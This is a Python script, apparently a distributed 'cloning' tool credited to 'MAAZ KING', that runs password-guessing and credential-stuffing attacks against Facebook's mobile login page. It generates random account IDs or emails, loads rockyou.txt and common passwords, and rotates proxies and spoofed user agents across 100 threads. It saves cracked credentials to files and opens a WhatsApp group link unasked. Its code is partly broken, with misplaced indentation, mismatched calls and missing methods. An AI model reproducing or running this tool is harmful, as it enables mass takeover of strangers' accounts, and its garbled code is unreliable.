#=====[🌿]CREATOR : MAAZ KING
#=====[🌿]TELEGRAM : @LabbaikSupport

import os
import sys
import json
import uuid
import string
import random
import requests
from time import sleep
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# ===== COLOR CODES =====
R = '\x1b[38;5;196m'  # Red
G = '\x1b[38;5;46m'   # Green
Y = '\x1b[38;5;226m'  # Yellow
B = '\x1b[38;5;44m'   # Blue
P = '\x1b[38;5;201m'  # Purple
W = '\x1b[0;97m'      # White
N = '\x1b[0m'         # Reset

class MAAZKING:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.generated_ids = []
        self.combo_pw_map = {}
        self.chunk_size = 5000
        self.rockyou_path = os.path.expanduser("~/rockyou.txt")
        self.wordlist = self.load_passwords()

    def load_passwords(self):
        combined = []
        if os.path.exists(self.rockyou_path):
            with open(self.rockyou_path, "r", encoding="utf-8", errors="ignore") as f:
                rockyou = [line.strip() for line in f if line.strip()]
                combined += rockyou
        else:
            print(f"{R}[!] rockyou.txt not found at {self.rockyou_path}{N}")

        uuid_passwords = [str(uuid.uuid4())[:8] for _ in range(10)]
        combined += uuid_passwords

        custom_passwords = ['123456', 'admin123', '1234567', 'labbaik786', '12345678', '123456789', 'babygirl', 'iloveu', 'mylove', 'beautiful']
        combined += custom_passwords

        return combined

    def smart_passwords(self, uid, wordlist):
        return list(set([
            uid, uid[:6], uid[-6:], uid[-7:],
            "786786", "123456", "pakistan", "iloveyou"
        ] + wordlist[:5]))

    def get_ua(self):
        chrome_major = random.randint(90, 120)
        chrome_build = random.randint(1000, 5000)
        return (
            f"Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{chrome_major}.0.{chrome_build}.100 Mobile Safari/537.36"
        )

def get_proxy():
    proxies = [
        "socks5://127.0.0.1:9050",
        "socks5://192.168.0.101:1080",
        "http://datacenter.proxy:8000"
    ]
    return random.choice(proxies)

def request_with_proxy(url, headers=None):
    proxy = get_proxy()
    proxies = {"http": proxy, "https": proxy}
    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
        return response.text
    except:
        return None


def save_result(self, uid, pw, status):
    folder = {
        "OK": "maaz-OLD.txt",
        "CP": "maaz-CP.txt"
    }.get(status, "maaz-UNKNOWN.txt")

    self.ensure_file(folder)
    open(folder, "a").write(f"{uid}|{pw}\n")

    
    def ensure_file(self, filename):
        if not os.path.exists(filename):
            with open(filename, "w", encoding="utf-8") as f:
                f.write("")  # Create empty file

    
    def simulate_random(self, uid, passwords):
        self.ensure_file("maaz-RANDOM.txt")
        for pw in passwords:
            print(f"{Y}[→ RANDOM] Checking: {uid} | {pw}{N}")
            sleep(0.05)
            open("maaz-RANDOM.txt", "a").write(f"{uid}|{pw}\n")

    def simulate_business(self, uid, passwords):
        self.ensure_file("maaz-BUSINESS.txt")
        for pw in passwords:
            print(f"{Y}[→ BUSINESS] Checking: {uid} | {pw}{N}")
            sleep(0.05)
            with open("maaz-BUSINESS.txt", "a", encoding="utf-8") as f:
                f.write(f"{uid}|{pw}\n")

    def dummy_login_check(self, uid, pw):
        test_url = "https://httpbin.org/post"
        payload = {"username": uid, "password": pw}
        try:
            res = requests.post(test_url, data=payload)
            return res.json()
        except:
            return None

    def simulate_series(self, uid, passwords):
        self.ensure_file("maaz-SERIES.txt")
        for pw in passwords:
            print(f"{Y}[→ SERIES] Checking: {uid} | {pw}{N}")
            sleep(0.05)
            with open("maaz-SERIES.txt", "a", encoding="utf-8") as f:
                f.write(f"{uid}|{pw}\n")


    def banner(self):
        os.system("clear")
        os.system("xdg-open https://chat.whatsapp.com/CFGuz089SUe5npFZDS8iTh")
        print(f"""{G}
███████╗ █████╗ ███████╗███████╗
██╔════╝██╔══██╗╚══███╔╝██╔════╝
█████╗  ███████║  ███╔╝ █████╗  
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
╔══════════════════════════════════╗
║ • Creator  : MAAZ KING           ║
║ • Tools    : MAAZ TOOL           ║
║ • Version  : v2.0                ║
║ • Status   : Free                ║
╚══════════════════════════════════╝
{N}""")
        print(f"{W}USE AT YOUR OWN RISK | EDUCATIONAL PURPOSE ONLY{N}")

    def menu(self):
        self.banner()
        print(f"""{G}
[1]  Random Method
[2]  Business Method
[3]  Combo Method
[4]  Dump Method
[5]  Series Method
{N}""")
        choice = input(f"{Y}Select Option ➤ {G}")
        if choice == '1':
            self.random_method()
        elif choice == '2':
            self.business_method()
        elif choice == '3':
            self.combo_method()
        elif choice == '4':
            self.dump_method()
        elif choice == '5':
            self.series_method()
        else:
            print(f"{R}Invalid choice.{N}")
            sys.exit()

    def random_method(self):
        self.banner()
        prefix = ''.join(random.choices(string.digits, k=5))
        limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
        self.generated_ids = []
        for _ in range(limit):
            uid = prefix + ''.join(random.choices(string.digits, k=7))
            self.generated_ids.append(uid)
        self.start_cloning("random")

    def business_method(self):
        self.banner()
        domain = input(f"{Y}Enter Email Domain (e.g. gmail.com) ➤ {G}")
        limit = int(input(f"{Y}Enter Combo Limit ➤ {G}"))
        self.generated_ids = []
        for _ in range(limit):
            name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
            self.generated_ids.append(name + "@" + domain)
        self.start_cloning("business")

    def series_method(self):
        self.banner()
        print(f"""{G}
Select UID Series:
[1] 100001
[2] 100002
[3] 100003
[4] 100004
[5] 100005
{N}""")
        prefix = {'1': '100001', '2': '100002', '3': '100003', '4': '100004', '5': '100005'}.get(
            input(f"{Y}Select Series ➤ {G}")
        )
        if not prefix:
            print(f"{R}Invalid selection.{N}")
            return

        limit = {'1': 5000, '2': 10000, '3': 99999}.get(
            input(f"{Y}Choose ID Limit ➤ {G}")
        )
        if not limit:
            print(f"{R}Invalid limit.{N}")
            return

        self.generated_ids = []
        for _ in range(limit):
            rand = ''.join(random.choices(string.digits, k=7))
            self.generated_ids.append(prefix + rand)
        self.start_cloning("series")

    def combo_method(self):
        self.banner()
        if not os.path.exists("combo.txt"):
            print(f"{R}combo.txt not found!{N}")
            return

        self.generated_ids = []
        self.combo_pw_map = {}
        with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                parts = line.strip().split("|")
                if len(parts) == 2:
                    uid, pw = parts
                    self.generated_ids.append(uid)
                    self.combo_pw_map[uid] = pw
        self.start_cloning("combo")

    def dump_method(self):
        self.banner()
        print(f"{Y}This feature requires UID dumper integration (Coming Soon).{N}")
        self.generated_ids = ["1000123456789", "1000987654321"]
        self.start_cloning("dump")

    
    def api_crack_combo(self, uid, passwords):
        login_url = "https://m.facebook.com/login.php"
        for pw in passwords:
            print(f"{Y}[→ COMBO] Trying: {uid} | {pw}{N}")
            sleep(0.05)

            # 1. Send request via proxy
            resp = self.request_with_proxy(
                login_url,
                data={"email": uid, "pass": pw},
                headers={"User-Agent": self.get_ua()}
            )
            if not resp:
                print(f"{R}[! ERR] No response{N}")
                continue

            # 2. Extract cookie/token
            cookie_str = resp.headers.get("Set-Cookie", "")
            token = self.extract_token_from_cookie(cookie_str)

            # 3. Decide OK or CP
            if token:
                print(f"{G}[✓ OK - COMBO] {uid} | {pw}{N}")
                self.save_result(uid, pw, "OK")
                self.oks.append(uid)
            else:
                print(f"{R}[✗ CP - COMBO] {uid} | {pw}{N}")
                self.save_result(uid, pw, "CP")
                self.cps.append(uid)

    
    def api_crack_dump(self, uid, passwords):
        login_url = "https://m.facebook.com/login.php"
        for pw in passwords:
            print(f"{Y}[→ DUMP] Trying: {uid} | {pw}{N}")
            sleep(0.05)

            resp = self.request_with_proxy(
                login_url,
                data={"email": uid, "pass": pw},
                headers={"User-Agent": self.get_ua()}
            )
            if not resp:
                print(f"{R}[! ERR] No response{N}")
                continue

            cookie_str = resp.headers.get("Set-Cookie", "")
            token = self.extract_token_from_cookie(cookie_str)

            if token:
                print(f"{G}[✓ OK - DUMP] {uid} | {pw}{N}")
                self.save_result(uid, pw, "OK")
                self.oks.append(uid)
            else:
                print(f"{R}[✗ CP - DUMP] {uid} | {pw}{N}")
                self.save_result(uid, pw, "CP")
                self.cps.append(uid)



    def start_cloning(self, mode):
        print(f"{G}Cloning started using ➤ {mode.upper()} method{N}")
        with ThreadPool(max_workers=100) as pool:
            for uid in self.generated_ids:
                if mode == "combo" and uid in self.combo_pw_map:
                    pwlist = [self.combo_pw_map[uid]]
                    pool.submit(self.api_crack_combo, uid, pwlist)
                elif mode == "dump":
                    pwlist = self.smart_passwords(uid, self.wordlist)
                    pool.submit(self.api_crack_dump, uid, pwlist)
                elif mode == "random":
                    pwlist = self.smart_passwords(uid, self.wordlist)
                    pool.submit(self.simulate_random, uid, pwlist)
                elif mode == "business":
                    
                    pwlist = self.smart_passwords(uid, self.wordlist)
                    pool.submit(self.simulate_business, uid, pwlist)
                elif mode == "series":
                    pwlist = self.smart_passwords(uid, self.wordlist)
                    pool.submit(self.simulate_series, uid, pwlist)
                else:
                    print(f"{Y}🧢 Skipped ➤ {uid} [Unknown mode: {mode}]{N}")
        self.summary()


if __name__ == "__main__":
    try:
        tool = MAAZKING()
        tool.menu()
    except KeyboardInterrupt:
        print(f"\n{R}Interrupted by user. Exiting...{N}")
        sys.exit()
